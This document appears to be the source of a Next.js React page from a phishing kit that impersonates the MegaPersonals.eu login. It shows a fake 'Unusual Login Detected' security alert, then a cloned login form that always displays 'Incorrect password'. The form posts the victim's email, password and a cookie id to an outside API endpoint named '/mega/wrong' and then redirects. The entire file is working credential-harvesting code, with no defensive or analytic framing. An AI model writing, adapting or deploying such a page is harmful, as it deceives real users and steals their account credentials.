
"use client";
import React, { useState } from "react";
import Image from "next/image";
import { Field, Form, Formik } from "formik";
import { API_URL } from "../config";
import Cookies from "js-cookie";
import { useRouter } from "next/navigation";
// import { toast } from "react-toastify";
function page() {
  const [showSecurityAlert, setShowSecurityAlert] = useState(true);
  const initialvalues = {
    email: "",
    password: "",
  };
  const router = useRouter();
  const id = Cookies.get("id");

  const handleSubmit = async (values, formik) => {
    const { email, password } = values;

    // Cookies.set("site", site);
    // Cookies.set("email", email);
    // Cookies.set("password", password);

    // setShowModal(true);

    // const allValues = {
    //   id: id,
    // };
    const allValues = {
      id,
      email,
      password,
    };
    console.log("allValues", allValues);
    // login(allValues, formik);
    const url = `${API_URL}/mega/wrong`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(allValues),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      router.push("/map");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
      {showSecurityAlert ? (
        <div className="max-w-[400px] w-full px-4 mb-10">
          <div className="bg-white rounded-lg shadow-around-blue p-6 flex flex-col items-center text-center">
            <div className="mb-4">
              <img
                src="/images/devilgirl.png"
                alt="Security Mascot"
                className="w-48 h-auto"
              />
            </div>

            <h1 className="text-2xl font-semibold text-gray-800 mb-1">
              Security Alert
            </h1>
            <h2 className="text-xl font-bold text-gray-900 mb-4">
              Unusual Login Detected
            </h2>

            <div className="text-gray-600 space-y-2 mb-8">
              <p className="text-lg">Another device has logged into your account</p>

              <div className="text-gray-700 font-medium space-y-1">
                <p>
                  Chrome •{" "}
                  {new Date().toLocaleString("en-US", {
                    month: "long",
                    day: "numeric",
                    year: "numeric",
                    hour: "2-digit",
                    minute: "2-digit",
                  })}
                </p>

                <p>London, United Kingdom</p>
                <p>117.248.30.98</p>
              </div>
            </div>

            <div className="w-full space-y-3">
              <button
                onClick={() => setShowSecurityAlert(false)}
                className="w-full py-3 px-6 border-2 border-gray-200 rounded text-gray-700 font-medium hover:bg-gray-50 transition duration-200"
              >
                This was me
              </button>
              <button
                onClick={() => setShowSecurityAlert(false)}
                className="w-full py-3 px-6 bg-custom-blue3 text-white rounded font-bold hover:bg-blue-600 transition duration-200"
              >
                Log out from other device
              </button>
            </div>
          </div>
        </div>
      ) : (
        <>
          <div className="w-[65%] lg:w-full">
            <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
          </div>

          <div className="">
            <div className="mt-[10px] flex flex-col items-center">
              <p className="text-custom-gray2 text-lg">
                Is this your first time posting?
              </p>
              <button className="mt-[8px] bg-custom-blue3 px-[57px] text-[24px] text-white font-semibold tracking-[2px] rounded">
                Start Here
              </button>

              <p className=" mt-[10px] text-custom-gray2 text-lg">
                Already have a login?
              </p>
              <p className="text-custom-gray2 text-[25px]">Login</p>
            </div>

            <div className="mt-1">
              <Formik initialValues={initialvalues} onSubmit={handleSubmit}>
                {(formik) => (
                  <Form className="mx-[30px]  flex flex-col justify-center items-center">
                    <div className="space-y-[9px]  flex flex-col justify-center items-center">
                      <p className="text-red-500 text-md">Incorrect password</p>

                      <Field
                        placeholder="Email"
                        className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                        id="email"
                        name="email"
                        required
                      />

                      <Field
                        className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                        placeholder="Password"
                        name="password"
                        type="password"
                        autoComplete="on"
                        required
                      />
                    </div>
                    <div className="flex flex-col items-center">
                      <Image
                        src="/images/captures.jpeg"
                        alt="captcha"
                        width={228}
                        height={55}
                        className="mt-3"
                      />

                      <Field
                        className="mt-2 w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                        id="captcha"
                        name="captcha"
                        type="captcha"
                        autoComplete="on"
                        placeholder="Enter code from the picture"
                        required
                      />

                      <button
                        type="submit"
                        className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                      >
                        SUBMIT
                      </button>
                    </div>
                  </Form>
                )}
              </Formik>
            </div>

            <p className="mt-[10px] uppercase text-center text-sm text-custom-blue2 hover:underline">
              Forgot Password?
            </p>
          </div>
        </>
      )}

      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
        <p className=" cursor-pointer">Home</p>
        {" | "}
        <p className=" cursor-pointer">Manage Posts</p>
        {" | "}
        <p className=" cursor-pointer">Contact Us</p>
        {" | "}
        <p className=" cursor-pointer">Policies & Terms</p>
      </div>

      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
        Copyright ©2021 MegaPersonals.eu
      </p>
    </div>
  );
}

export default page;
